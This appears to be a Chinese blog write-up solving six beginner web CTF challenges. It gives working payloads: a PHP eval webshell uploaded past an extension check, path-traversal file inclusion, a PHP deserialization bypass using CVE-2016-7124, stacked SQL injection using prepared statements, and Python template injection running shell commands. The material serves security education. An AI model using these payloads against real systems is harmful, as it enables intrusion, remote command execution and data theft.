# 原创
：  【攻防世界WEB】难度二星6分入门题（下）：upload1、warmup、Web_php_unserialize、supersqli、Web_python_template_injection、wb2

# 【攻防世界WEB】难度二星6分入门题（下）：upload1、warmup、Web_php_unserialize、supersqli、Web_python_template_injection、wb2

**目录**

[七、upload1](#%E4%B8%83%E3%80%81upload1)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程](#%E8%BF%87%E7%A8%8B)

[八、warmup](#%E5%85%AB%E3%80%81warmup)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程](#%E8%BF%87%E7%A8%8B)

[九、Web_php_unserialize](#%E4%B9%9D%E3%80%81Web_php_unserialize)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程](#%E8%BF%87%E7%A8%8B)

[十、supersqli](#%E5%8D%81%E3%80%81supersqli)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程](#%E8%BF%87%E7%A8%8B)

[十一、Web_python_template_injection](#%E5%8D%81%E4%B8%80%E3%80%81Web_python_template_injection)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程](#%E8%BF%87%E7%A8%8B)

[ 十二、web2](#%C2%A0%E5%8D%81%E4%BA%8C%E3%80%81web2)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程](#%E8%BF%87%E7%A8%8B)

---


> 
<h2>推荐</h2>
[【攻防世界WEB】难度二星6分入门题（上）：webshell、command_execution、xff_referer、php_rce、Web_php_include、NewsCenter<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125905265?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125905265?spm=1001.2014.3001.5501)[【攻防世界WEB】难度一星3分入门题：get、post、robots、、cookie、button、weak、php、web、unserialize<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125892455?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125892455?spm=1001.2014.3001.5501)


## 七、upload1

> 

 

<h3>解题方法：</h3>
1、上传一句话木马


> 
<h3>过程</h3>
准备一句话木马
<pre><code>&lt;?php
@eval($_REQUEST['1']);
echo "成功了";
?&gt;</code></pre>

<hr/>

 上传图片一句话木马

将其后缀改为jpg或者png
<img alt="" height="266" src="https://img-blog.csdnimg.cn/8ac87f40267f47abb4f11e9ec7f3d2cf.png" width="802"/> 
<hr/>
bp抓包，又改回了php
<img alt="" height="671" src="https://img-blog.csdnimg.cn/a094c54087f845098c9dc07c50bcca4b.png" width="702"/> 

 返回了图片位置

在URL中加上图片地址，返回出，我们输出的字符了
http://61.147.171.105:63781/upload/1658413812.shell.php

<hr/>
 使用蚁剑（冰蝎、菜刀）连接
 <img alt="" height="872" src="https://img-blog.csdnimg.cn/f631eaf91b8f40029fe834f7218e7bcd.png" width="1200"/>
 在目录中找到了flag<img alt="" height="872" src="https://img-blog.csdnimg.cn/78152d9f317f43aba40ae9462667986a.png" width="1200"/>







---


---


---


## 八、warmup

> 

 

<h3>解题方法：</h3>
1、文件包含，php代码解析


> 
<h3>过程</h3>
Ctrl+U查看源码
发现了一个页面

 发现一个新页面

现在知道了flag文件夹

 

<hr/>
发现满足3个条件，可以包含我们构造的文件file<br/><img alt="" height="281" src="https://img-blog.csdnimg.cn/c3286dd412af45c6a2df82ca9540a9da.png" width="1009"/>
1、file变量非空
2、file变量为字符串
3、通过自定义函数checkFile()的检查

<hr/>
自定义函数checkFile()
满足4个if中其中一个即可返回true

 能返回true的条件：
1、为字符串
2、存在于数组中
3、截取参数中首次出现?之前的部分，该部分在$whitelist数组中
4、先进行 url 解码，再截取参数中首次出现?之前的部分，该部分在$whitelist中
<hr/>
payload
利用第三个 if
payload1：
source.php?file=source.php?/../../../../ffffllllaaaagggg
payload2：
source.php?file=hint.php%253f../../../../../../ffffllllaaaagggg
（第一个?用来传参，第二个?用来截断前面的，source.php是在$whitelist中的）
（../的个数是指一直找的层数，多几层不要紧）
（第二个?，二次URL编码为%253f，服务器解码一次，checkFile函数解码一次）
<hr/>
payload1：

 payload2：<img alt="" height="895" src="https://img-blog.csdnimg.cn/f086f1de84974d7ea820d0fdafe58c10.png" width="1200"/>



---


---


---


---


## 九、Web_php_unserialize

> 

 

<h3>解题方法：</h3>
1、php代码解析，序列化与反序列化


> 
<h3>过程</h3>
flag在flag.php文件中


<pre><code>&lt;?php 
class Demo { 
    private $file = 'index.php';  
//类的私有变量
    public function __construct($file) { 
//实例化对象，__construct() 函数，当类新建对象的时候会执行
        $this-&gt;file = $file;   
//将对象的file属性的值设置为file变量
    }
    function __destruct() {  
//__destruct() 函数，当对象被销毁时将会被调用
        echo @highlight_file($this-&gt;file, true);  
//输出读取到的文件
//highlight_file() 函数，输出指定PHP文件代码
    }
    function __wakeup() {    
//__wakeup() 函数，在unserialize()反序列化操作前会被调用
        if ($this-&gt;file != 'index.php') { 
            //the secret is in the fl4g.php  
//将对象的file参数设置为index.php
            $this-&gt;file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
//get方法传参
    $var = base64_decode($_GET['var']);  
//对获取到的参数var的值进行base64解码
    if (preg_match('/[oc]:\d+:/i', $var)) {  
//preg_match() 函数一个正则表达，匹配上了就返回true， \d匹配任意的数字  /i表示匹配时不区分大小写 /[oc]匹配oc字符
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
//unserialize() 函数用来反序列化字符串
    } 
} else { 
    highlight_file("index.php"); 
//highlight_file() 函数，输出指定PHP文件代码
} 
?&gt;</code></pre>
1、绕过base64_decode函数：对构造的语句进行base64编码
2、绕过preg_match函数：加个加号“+”，在反序列化串O（object）开头，
3、绕过wakeup函数：利用__wakeup()的CVE-2016-7124，在序列化的字符串当中当真实的属性个数大于真实的属性个数时，该函数不会执行
<hr/>
构造
<pre><code>&lt;?php
class Demo {     //定义Demo类
    private $file = 'fl4g.php';    //类的私有变量file为fl4g.php
}
$a = serialize(new Demo);//对其进行序列化操作
$a = str_replace('O:4', 'O:+4',$a);       //用+4替换4，绕过preg_match()函数的正则过滤
$a = str_replace(':1:', ':2:',$a);        //用2替换1，绕过__wakeup()函数，利用__wakeup()的CVE-2016-7124  在序列化的字符串当中当真实的属性个数大于真实的属性个数时  该函数不会执行
echo base64_encode($a);                   //进行base64编码，绕过解码函数
?&gt;</code></pre>
使用php在线运行

TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
构造
?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

 


---


---


## 十、supersqli

> 

 

<h3>解题方法：</h3>
1、SQL注入（堆叠注入，预编译）


> 
<h3>过程</h3>
加上单引号有报错，说明存在注入点

 使用#注释，没有报错，说明为单引号闭合

<hr/>
判断字段数
1'order by 2#
回显正常

1'order by 3#
报错，说明字段数为2


<hr/>
爆库
1'union select  1,database()#
看见存在正则匹配

<hr/>
看来可以使用堆叠注入中的show来查看
1'; show databases; # 
查询数据库

<hr/>
查询表 
 1';use supersqli;show tables;#

<hr/>
查字段
1';use supersqli;show columns from `1919810931114514`;#   
纯数字字符串是表名的时候，需要加反引号`


<hr/>
爆数据
因为select被过滤，不能直接查询
考虑使用预编译
1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#
或者
1';  Set @sql = CONCAT('sele','ct flag from `1919810931114514`;');  prepare stmt from @sql;  EXECUTE stmt;#<img alt="" height="593" src="https://img-blog.csdnimg.cn/e5c5ac51075c443cbfe3c7e10841c256.png" width="1200"/>

 


---


---


---


---


---


## 十一、Web_python_template_injection

> 




<h3>解题方法：</h3>
1、python模板漏洞注入


> 
<h3>过程</h3>
表明存在漏洞

<hr/>
 查看全局变量config
可以发现未被禁用
思路1：直接查看服务器的本地文件
思路2：通过python的对象的继承一步步实现文件读取和命令执行，找到父类&lt;type ‘object’--寻找子类---找关于命令执行或者文件操作的模块


<hr/>
/{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
<pre><code>1、__ class__:查看变量所属的类
2、__ init __:初始化类，返回function
3、__ globals __: 获取function所处空间下可使用的module、方法以及所有变量
4、os.popen() 从一个命令打开一个管道
5、popen()：函数内的命令为要执行命令</code></pre>


<hr/>
读取fl4g的信息
/{{ config.__class__.__init__.__globals__['os'].popen('cat fl4g').read() }}



---


---


---


##  十二、web2

> 

 

<h3>解题方法：</h3>
1、逆向加密算法，解密获得flag 


> 
<h3>过程</h3>

函数：
1、strrev() 函数：反转字符串
2、substr函数：返回字符串的一部分，substr(**string**,**start**,**length**)
3、ord() 函数：返回字符串的首个字符的 ASCII 值
4、chr() 函数：从指定的 ASCII 值返回字符，chr(**ascii**)
5、str_rot13() 函数：对字符串执行 ROT13 编码。ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变，str_rot13(**string**)


<hr/>
解码
就是将加密的顺序反过来
<pre><code>&lt;?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
$miwen=base64_decode(strrev(str_rot13($miwen)));   

$m=$miwen;
for($i=0;$i&lt;strlen($m);$i++){
	$_c=substr($m,$i,1);
	$__=ord($_c)-1;    # 字符转数字再减1
	$__=chr($__);      # 数字转字符 
    $_=$_.$__;         # 拼接字符串
	}
echo strrev($_);        # 反转字符串
?&gt;</code></pre>
php在线运行



